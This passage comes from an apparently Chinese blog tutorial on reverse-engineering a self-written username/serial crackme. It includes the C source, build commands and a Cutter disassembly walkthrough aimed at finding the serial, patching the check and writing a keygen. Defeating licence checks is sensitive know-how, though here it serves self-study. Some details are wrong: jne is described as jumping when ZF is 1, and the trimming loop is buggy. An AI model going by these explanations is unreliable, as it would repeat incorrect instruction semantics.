&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">c&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="sc">&amp;#39;\n&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="n">c&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">fgetc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">stream&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="o">*&lt;/span>&lt;span class="n">p&lt;/span>&lt;span class="o">++&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sc">&amp;#39;\0&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="o">*&lt;/span>&lt;span class="n">lineptr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">bufptr&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="o">*&lt;/span>&lt;span class="n">n&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">size&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="n">p&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="n">bufptr&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="n">size_t&lt;/span> &lt;span class="nf">r_trim&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">str&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">size_t&lt;/span> &lt;span class="n">len&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">size_t&lt;/span> &lt;span class="n">slen&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">strnlen&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">str&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">len&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">size_t&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">slen&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">&amp;gt;=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">str&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="sc">&amp;#39; &amp;#39;&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="n">str&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="sc">&amp;#39;\n&amp;#39;&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="n">str&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="sc">&amp;#39;\r&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">str&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sc">&amp;#39;\0&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="n">strnlen&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">str&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">len&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nf">calculate&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">username&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">const&lt;/span> &lt;span class="n">size_t&lt;/span> &lt;span class="n">username_len&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// 初始化固定8字节计算密钥的空间
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">const&lt;/span> &lt;span class="n">size_t&lt;/span> &lt;span class="n">input_buf_len&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">input_buf&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">malloc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">input_buf_len&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">size_t&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="n">input_buf_len&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">input_buf&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x52&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// 用用户输入替换初始化的数据
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">memcpy_s&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">input_buf&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">input_buf_len&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">username&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">username_len&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// 异或处理
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">size_t&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="n">input_buf_len&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">input_buf&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">^=&lt;/span> &lt;span class="mh">0x25&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// 初始化 Hex 输出
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">const&lt;/span> &lt;span class="n">size_t&lt;/span> &lt;span class="n">output_buf_len&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">17&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">output_buf&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">malloc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">output_buf_len&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// 转为可读字符串
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">size_t&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="n">input_buf_len&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">sprintf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">output_buf&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="s">&amp;#34;%02x&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">input_buf&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="n">output_buf&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">free&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">input_buf&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="n">output_buf&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kt">int&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">while&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">username&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">size_t&lt;/span> &lt;span class="n">username_len&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">serial&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">size_t&lt;/span> &lt;span class="n">serial_len&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">size_t&lt;/span> &lt;span class="n">linesize&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;username:&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">linesize&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">getline&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">username&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">username_len&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">stdin&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">username_len&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">r_trim&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">username&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">linesize&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">username_len&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">free&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">username&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">puts&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;username less than 8 letter&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">continue&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">username_len&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">free&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">username&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">continue&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="n">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;serial:&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">linesize&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">getline&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">serial&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">serial_len&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">stdin&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">serial_len&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">r_trim&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">serial&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">linesize&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">serial_len&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">16&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">free&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">username&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">free&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">serial&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">puts&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;serial has 16 letters&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">continue&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">correct&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">calculate&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">username&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">username_len&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="kt">int&lt;/span> &lt;span class="n">rc&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">strncmp&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">serial&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">correct&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">16&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">rc&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">free&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">correct&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">puts&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Good job!&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">puts&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;wrong pwd!&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="n">free&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">username&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">free&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">serial&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">free&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">correct&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>编译方式是&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-batch" data-lang="batch">clang main.c -o cm02-easy.exe -Wall -m32 -O0
clang main.c -o cm02-normal.exe -Wall -m32 -O1
clang main.c -o cm02-hard.exe -Wall -m32 -O2
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="0x02-观察">0x02 观察&lt;/h2>
&lt;p>启动后观察行为（不截图了。）&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">weakptr in cm02 ❯ .\cm02-easy.exe
username:abc
serial:123456
serial 长度为16
username:abc
serial:123456789012345
wrong pwd!
username:
serial:
serial 长度为16
username:abc
serial:aaaaaaaaaaaaaaa
wrong pwd!
&lt;/code>&lt;/pre>&lt;/div>&lt;p>这次的目标是：&lt;/p>
&lt;ol>
&lt;li>得到某个用户名对应的序列号（&lt;code>serial&lt;/code>）。&lt;/li>
&lt;li>破解，总是正确或对任何输入都提示正确。&lt;/li>
&lt;li>注册机。&lt;/li>
&lt;/ol>
&lt;h2 id="0x03-静态分析---easy">0x03 静态分析 - easy&lt;/h2>
&lt;h3 id="31-主循环">3.1 主循环&lt;/h3>
&lt;p>在公司没IDA，用 &lt;a class="link" href="image/crackme-02/https://cutter.re/" >Cutter&lt;/a> 打开，在上方输入框输入 &lt;code>main&lt;/code> 跳转到 &lt;code>main&lt;/code> 函数。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/crackme-02/cm02-easy-1.png"
loading="lazy"
alt="image-20210914114426600"
>&lt;/p>
&lt;p>然后点击 &lt;em>图表（main）&lt;/em> 进入类似 IDA 的控制流视图。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/crackme-02/cm02-easy-2.png"
loading="lazy"
alt="image-20210914114547128"
>&lt;/p>
&lt;p>之后就能看到下面的控制流了。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/crackme-02/cm02-easy-3.png"
loading="lazy"
>&lt;/p>
&lt;p>easy难度下没有开启任何编译器优化，控制流和原始代码能直接对应上。瞧着困难很多对吧？&lt;/p>
&lt;p>先简单扫一眼，会发现很多分支直接跳回了&lt;code>0x0040139d&lt;/code>，也就是从上往下数第二个代码块，基本每个跳转都是下一个块或跳回这个块。按照 &lt;a class="link" href="https://nnnewb.github.io/blog/p/crackme-01/" target="_blank" rel="noopener"
>cm01&lt;/a>的经验，我们先找到关键的一跳。可以直接搜索字符串引用（&lt;code>wrong pwd!&lt;/code>），也可以逐个代码块看下去。&lt;/p>
&lt;p>很快，右下角的关键跳出现在眼前。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/crackme-02/cm02-easy-4.png"
loading="lazy"
alt="image-20210914152834262"
>&lt;/p>
&lt;p>接着回头看跳转条件。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/crackme-02/cm02-easy-5.png"
loading="lazy"
alt="image-20210914153728179"
>&lt;/p>
&lt;p>虽然没有名字，但&lt;code>fcn.00403ef4&lt;/code> 是老熟人了。三个参数，&lt;code>ecx&lt;/code>、&lt;code>eax&lt;/code>、&lt;code>0x10&lt;/code>，返回结果和&lt;code>0&lt;/code>做比较，&lt;code>jne&lt;/code>条件跳转。&lt;/p>
&lt;ul>
&lt;li>&lt;code>cmp&lt;/code>指令，操作数相减（&lt;code>dest&lt;/code>-&lt;code>src&lt;/code>），结果存入标志位 &lt;code>SF&lt;/code>和&lt;code>ZF&lt;/code>。
&lt;ul>
&lt;li>结果是负数（&lt;code>dest&lt;/code>&amp;lt;&lt;code>src&lt;/code>），&lt;code>SF&lt;/code>也就是结果符号位设置为1。&lt;/li>
&lt;li>结果是正数（&lt;code>dest&lt;/code>&amp;gt;&lt;code>src&lt;/code>），&lt;code>SF&lt;/code>也就是结果符号位设置为0。&lt;/li>
&lt;li>结果是0（&lt;code>dest&lt;/code>=&lt;code>src&lt;/code>），&lt;code>ZF&lt;/code>设置为1。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;code>jne&lt;/code>或&lt;code>jnz&lt;/code>指令，非零跳转。&lt;code>ZF&lt;/code>标志位为&lt;code>1&lt;/code>时跳转。&lt;/li>
&lt;/ul>
&lt;p>猜测这个函数应该是&lt;code>strncmp&lt;/code>。继续往回看参数是怎么来的。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/crackme-02/cm02-easy-6.png"
loading="lazy"
alt="image-20210914155544252"
>&lt;/p>
&lt;p>&lt;code>eax&lt;/code>来自&lt;code>sub.02x_40298c&lt;/code>这个函数，后面两个脱裤子放屁的&lt;code>mov&lt;/code>忽略。&lt;code>ecx&lt;/code>则来来自&lt;code>mov ecx,dword [ebp-10h]&lt;/code>这一行。&lt;/p>
&lt;p>先不着急分析函数，继续往回找，找到&lt;code>[ebp-10h]&lt;/code>的来源。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/crackme-02/cm02-easy-7.png"
loading="lazy"
alt="image-20210914161814604"
>&lt;/p>
&lt;p>在入口点附近，看到&lt;code>[ebp-10]&lt;/code>被初始化成了0。&lt;/p>
&lt;p>因为没有很明确的路径，手动计算栈上偏移又非常麻烦，这里本应该掏出调试器——但出于学习练手的目的，还是先尝试计算下。首先回顾下简化的栈内存布局，从上往下增长，如图。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/crackme-02/cm02-easy-8.png"
loading="lazy"
alt="stack-layout"
>&lt;/p>
&lt;p>接下来从&lt;code>mov ebp,esp&lt;/code>开始，往下列出所有函数调用，捋一捋逻辑。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/crackme-02/cm02-easy-9.png"
loading="lazy"
alt="image-20210914214920437"
>&lt;/p>
&lt;p>第一个框，&lt;code>[esp+2ch+Ix]&lt;/code> 计算结果是 &lt;code>[esp]&lt;/code>，也就是栈顶，栈顶设置为字符串 &lt;code>username:&lt;/code>，接着调用一个未知函数。从参数判断我们先认为是一个输出字符串的函数。&lt;/p>
&lt;p>再看第二个框，&lt;code>acrt_iob_func&lt;/code>，百度一下就会发现，&lt;code>__acrt_iob_func&lt;/code>函数是定义于 c 运行库里的函数，作用是返回 &lt;code>stdin/stdout/stderr&lt;/code> 。栈顶设置为0，所以获得的是 &lt;code>stdin&lt;/code>。&lt;/p>
&lt;p>再看第三个框，&lt;code>edx&lt;/code>和&lt;code>ecx&lt;/code>赋值为栈上两个变量的地址，再为参数。按顺序就是&lt;code>f(edx,ecx,stdin)&lt;/code>。暂时不明。函数返回值被赋值回了&lt;code>[ebp-18h]&lt;/code>。&lt;/p>
&lt;p>第四个框，从第三个框得到的返回值被当参数传给一个未知函数。&lt;code>f([ebp-8h], [ebp-18h])&lt;/code>，返回值被赋值回 &lt;code>[ebp-0Ch]&lt;/code>。&lt;/p>
&lt;p>结合最后的 &lt;code>cmp&lt;/code> 和 &lt;code>jbe&lt;/code> 指令分析，人肉反编译后用伪代码表示，就是下面这样。&lt;code>jbe&lt;/code>指令只在&lt;code>cmp&lt;/code>左操作数小于等于右操作数时执行跳转（&lt;code>CF&lt;/code>标志位和&lt;code>ZF&lt;/code>标志位其中一个为1时）。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="n">var&lt;/span> &lt;span class="n">var_8&lt;/span> &lt;span class="c1"># 偏移值 ebp-8h&lt;/span>
&lt;span class="n">var&lt;/span> &lt;span class="n">var_0C&lt;/span> &lt;span class="c1"># 偏移值 ebp-0Ch&lt;/span>
&lt;span class="n">var&lt;/span> &lt;span class="n">var_18&lt;/span> &lt;span class="c1"># 偏移值 ebp-18h&lt;/span>
&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;username:&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">var_18&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">unknown_func1&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">var_8&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">var_0c&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">stdin&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">var_0c&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">unknown_func2&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">var_8&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">var_18&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="n">var_0c&lt;/span> &lt;span class="o">&amp;lt;=&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="o">...&lt;/span> &lt;span class="c1"># jbe 跳转执行&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/crackme-02/cm02-easy-10.png"
loading="lazy"
alt="image-20210914223919137"
>&lt;/p>
&lt;p>可以看出，当 &lt;code>var_0c&lt;/code> 小于 8 时，提示 &lt;code>username less than 8 letter&lt;/code> 。因此可以确定 &lt;code>[ebp-0Ch]&lt;/code> 这个变量就是 &lt;code>username&lt;/code> 字符串的长度，上一个函数会计算字符串长度返回。我们再根据这个发现修改下伪代码。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="n">var&lt;/span> &lt;span class="n">var_8&lt;/span> &lt;span class="c1"># 偏移值 ebp-8h&lt;/span>
&lt;span class="n">var&lt;/span> &lt;span class="n">username_len&lt;/span> &lt;span class="c1"># 偏移值 ebp-0Ch&lt;/span>
&lt;span class="n">var&lt;/span> &lt;span class="n">var_18&lt;/span> &lt;span class="c1"># 偏移值 ebp-18h&lt;/span>
&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;username:&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">var_18&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">unknown_func1&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">var_8&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">username_len&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">stdin&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1"># var_8 可能是 username 指针&lt;/span>
&lt;span class="n">username_len&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">unknown_func2&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">var_8&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">var_18&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1"># 计算字符串长度&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="n">username_len&lt;/span> &lt;span class="o">&amp;lt;=&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="o">...&lt;/span> &lt;span class="c1"># jbe 跳转执行&lt;/span>
&lt;span class="k">else&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="c1"># jmp 到开头&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>第一个未知函数看起来已经呼之欲出了，&lt;code>stdin&lt;/code>和&lt;code>&amp;amp;username_len&lt;/code>作为参数，&lt;code>var_8&lt;/code> 有极大可能就是&lt;code>username&lt;/code>字符串指针。不过在进入调试器前，还不能马上下结论，继续看正确跳转的代码。&lt;/p>
